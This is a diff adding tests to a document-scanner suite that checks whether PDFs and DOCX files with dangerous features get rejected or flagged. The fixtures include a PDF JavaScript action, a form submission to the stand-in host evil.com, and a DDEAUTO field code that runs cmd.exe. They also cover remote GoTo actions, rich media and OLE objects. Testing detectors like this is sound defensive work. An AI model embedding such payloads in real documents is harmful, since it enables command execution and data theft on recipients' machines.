@@ -106,6 +106,34 @@ describe("pdf threats", () => {
     ).toBe(true);
   });
 
+  test("PDF with /JS action → reject", async () => {
+    const r = Result.unwrap(
+      await scanFile({
+        buffer: await makePdf("/JS (alert('xss'))"),
+        declaredMimeType: "application/pdf",
+        fileName: "evil.pdf",
+      }),
+    );
+    expect(r.verdict).toBe("reject");
+    expect(
+      r.findings.some(
+        (f) => f.severity === "reject" && f.message.includes("/JS"),
+      ),
+    ).toBe(true);
+  });
+
+  test("PDF with font subset name /JSUIQA+Arial → pass", async () => {
+    const r = Result.unwrap(
+      await scanFile({
+        buffer: await makePdf("/BaseFont/JSUIQA+Arial/DescendantFonts 81 0 R"),
+        declaredMimeType: "application/pdf",
+        fileName: "font.pdf",
+      }),
+    );
+    const jsFindings = r.findings.filter((f) => f.rule === "pdf_javascript_js");
+    expect(jsFindings).toHaveLength(0);
+  });
+
   test("PDF with /Launch → reject", async () => {
     const r = Result.unwrap(
       await scanFile({
@@ -120,6 +148,54 @@ describe("pdf threats", () => {
         (f) => f.severity === "reject" && f.message.includes("/Launch"),
       ),
     ).toBe(true);
+  });
+
+  test("PDF with /SubmitForm → warn", async () => {
+    const r = Result.unwrap(
+      await scanFile({
+        buffer: await makePdf("/SubmitForm /F (http://evil.com)"),
+        declaredMimeType: "application/pdf",
+        fileName: "exfil.pdf",
+      }),
+    );
+    expect(r.verdict).not.toBe("pass");
+    expect(r.findings.some((f) => f.rule === "pdf_submit_form")).toBe(true);
+  });
+
+  test("PDF with /GoToR → warn", async () => {
+    const r = Result.unwrap(
+      await scanFile({
+        buffer: await makePdf("/GoToR /F (remote.pdf)"),
+        declaredMimeType: "application/pdf",
+        fileName: "remote.pdf",
+      }),
+    );
+    expect(r.verdict).not.toBe("pass");
+    expect(r.findings.some((f) => f.rule === "pdf_goto_remote")).toBe(true);
+  });
+
+  test("PDF with /GoToE → warn", async () => {
+    const r = Result.unwrap(
+      await scanFile({
+        buffer: await makePdf("/GoToE /D (embedded.pdf)"),
+        declaredMimeType: "application/pdf",
+        fileName: "embedded.pdf",
+      }),
+    );
+    expect(r.verdict).not.toBe("pass");
+    expect(r.findings.some((f) => f.rule === "pdf_goto_embedded")).toBe(true);
+  });
+
+  test("PDF with /RichMedia → warn", async () => {
+    const r = Result.unwrap(
+      await scanFile({
+        buffer: await makePdf("/RichMedia /Subtype /Flash"),
+        declaredMimeType: "application/pdf",
+        fileName: "flash.pdf",
+      }),
+    );
+    expect(r.verdict).not.toBe("pass");
+    expect(r.findings.some((f) => f.rule === "pdf_rich_media")).toBe(true);
   });
 
   test("PDF with /EmbeddedFile → warn", async () => {
@@ -438,6 +514,50 @@ describe("ooxml threats", () => {
     );
     expect(r.verdict).toBe("reject");
     expect(r.findings.some((f) => f.rule.includes("ooxml_activex"))).toBe(true);
+  });
+
+  test("DOCX with DDE field code → reject", async () => {
+    const buffer = await makeThreatDocx({
+      extraFiles: {
+        "word/document.xml":
+          "<w:document><w:body><w:p><w:r>" +
+          '<w:fldChar w:fldCharType="begin"/>' +
+          "</w:r><w:r>" +
+          '<w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc"</w:instrText>' +
+          "</w:r></w:p></w:body></w:document>",
+      },
+    });
+    const r = Result.unwrap(
+      await scanFile({
+        buffer,
+        declaredMimeType: DOCX_MIME,
+        fileName: "dde.docx",
+      }),
+    );
+    expect(r.verdict).toBe("reject");
+    expect(r.findings.some((f) => f.rule.includes("ooxml_dde"))).toBe(true);
+  });
+
+  test("DOCX with OLE object → warn", async () => {
+    const buffer = await makeThreatDocx({
+      extraFiles: {
+        "word/embeddings/oleObject1.bin": "OLE_DATA",
+      },
+      contentTypesXml:
+        '<?xml version="1.0"?>' +
+        '<Types><Override PartName="/word/embeddings/oleObject1.bin" ' +
+        'ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>' +
+        "</Types>",
+    });
+    const r = Result.unwrap(
+      await scanFile({
+        buffer,
+        declaredMimeType: DOCX_MIME,
+        fileName: "ole.docx",
+      }),
+    );
+    expect(r.verdict).not.toBe("pass");
+    expect(r.findings.some((f) => f.rule.includes("ooxml_ole"))).toBe(true);
   });
 
   test("DOCX with remote template reference → reject", async () => {
